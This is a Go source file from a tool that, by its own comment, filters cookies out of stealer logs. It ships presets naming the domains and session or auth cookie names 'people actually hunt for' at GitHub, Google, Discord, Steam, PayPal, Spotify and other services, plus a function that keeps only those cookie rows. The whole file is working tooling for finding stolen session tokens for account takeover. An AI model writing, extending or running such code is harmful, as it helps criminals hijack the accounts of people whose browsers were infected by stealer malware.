package main

import "strings"

// BuiltinPreset is a named pack of domains (+ optional auth cookie names)
// available to every user without saving.
type BuiltinPreset struct {
	Name        string
	Label       string // button label
	Domains     []string
	CookieNames []string // if set, only these names (case-insensitive)
	Emoji       string
}

// BuiltinPresets ships the packs people actually hunt for in stealer logs.
var BuiltinPresets = []BuiltinPreset{
	{
		Name:    "cursor",
		Label:   "cursor",
		Emoji:   "🖥",
		Domains: []string{"cursor.com", "cursor.sh"},
		CookieNames: []string{
			"WorkosCursorSessionToken",
			"workos_cursor_session_token",
			"__session",
			"session",
		},
	},
	{
		Name:    "github",
		Label:   "github",
		Emoji:   "🐙",
		Domains: []string{"github.com"},
		CookieNames: []string{
			"user_session",
			"logged_in",
			"_gh_sess",
			"dotcom_user",
		},
	},
	{
		Name:    "discord",
		Label:   "discord",
		Emoji:   "💬",
		Domains: []string{"discord.com", "discordapp.com"},
		CookieNames: []string{
			"__dcfduid",
			"__sdcfduid",
			"__cfruid",
			"locale",
		},
	},
	{
		Name:    "steam",
		Label:   "steam",
		Emoji:   "🎮",
		Domains: []string{"steamcommunity.com", "steampowered.com", "steam.com"},
		CookieNames: []string{
			"steamLoginSecure",
			"sessionid",
			"steamCountry",
		},
	},
	{
		Name:    "netflix",
		Label:   "netflix",
		Emoji:   "🎬",
		Domains: []string{"netflix.com"},
		CookieNames: []string{
			"NetflixId",
			"SecureNetflixId",
			"profilesNewSession",
		},
	},
	{
		Name:    "google",
		Label:   "google",
		Emoji:   "🔍",
		Domains: []string{"google.com", "youtube.com", "gmail.com"},
		CookieNames: []string{
			"SID", "HSID", "SSID", "APISID", "SAPISID",
			"__Secure-1PSID", "__Secure-3PSID", "NID",
		},
	},
	{
		Name:    "epic",
		Label:   "epic",
		Emoji:   "🕹",
		Domains: []string{"epicgames.com", "unrealengine.com"},
		CookieNames: []string{
			"EPIC_SSO", "EPIC_SESSION_AP", "EPIC_DEVICE",
		},
	},
	{
		Name:    "riot",
		Label:   "riot",
		Emoji:   "🔴",
		Domains: []string{"riotgames.com", "leagueoflegends.com", "playvalorant.com"},
		CookieNames: []string{
			"tdid", "ssid", "sub", "csid",
		},
	},
	{
		Name:    "paypal",
		Label:   "paypal",
		Emoji:   "💳",
		Domains: []string{"paypal.com", "paypalobjects.com"},
		CookieNames: []string{
			"cookie_check", "login_email", "enforce_policy", "navlns",
		},
	},
	{
		Name:    "spotify",
		Label:   "spotify",
		Emoji:   "🎧",
		Domains: []string{"spotify.com"},
		CookieNames: []string{
			"sp_dc", "sp_key", "sp_t",
		},
	},
}

func getBuiltinPreset(name string) *BuiltinPreset {
	n := strings.ToLower(strings.TrimSpace(name))
	for i := range BuiltinPresets {
		if BuiltinPresets[i].Name == n {
			return &BuiltinPresets[i]
		}
	}
	return nil
}

func listBuiltinPresetNames() []string {
	out := make([]string, len(BuiltinPresets))
	for i, p := range BuiltinPresets {
		out[i] = p.Name
	}
	return out
}

// filterRowsByPreset keeps rows matching any domain (subdomain-aware) and,
// when CookieNames is non-empty, any of those names.
func filterRowsByPreset(rows []CookieRow, p *BuiltinPreset) []CookieRow {
	if p == nil {
		return rows
	}
	var out []CookieRow
	for _, r := range rows {
		domOK := false
		for _, d := range p.Domains {
			if domainMatchesTarget(r.Domain, d) {
				domOK = true
				break
			}
		}
		if !domOK {
			continue
		}
		if len(p.CookieNames) > 0 && !cookieNameMatches(r.Name, p.CookieNames) {
			continue
		}
		out = append(out, r)
	}
	return out
}

// rowMatchesAnyDomain uses subdomain-aware matching against a domain list.
func rowMatchesAnyDomain(r CookieRow, domains []string) bool {
	for _, d := range domains {
		if domainMatchesTarget(r.Domain, d) {
			return true
		}
	}
	return false
}
